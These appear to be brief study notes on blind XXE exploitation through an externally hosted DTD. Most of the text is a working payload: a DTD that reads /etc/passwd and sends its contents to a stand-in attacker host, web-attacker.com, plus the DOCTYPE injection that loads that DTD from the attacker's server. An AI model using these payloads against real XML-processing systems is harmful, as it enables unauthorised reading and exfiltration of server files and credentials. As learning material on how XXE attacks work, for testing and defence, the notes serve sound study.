1. usn=ing an external DTD method ---> suppose we hosted an external DTD on a webserver that we can control 
Eg --> we can also do it localy using python server

so on the server we need to host something like this:

<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;

once we have our malicious server setup we can request external entities like this 
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM
"http://web-attacker.com/malicious.dtd"> %xxe;]>

which can give us desired output
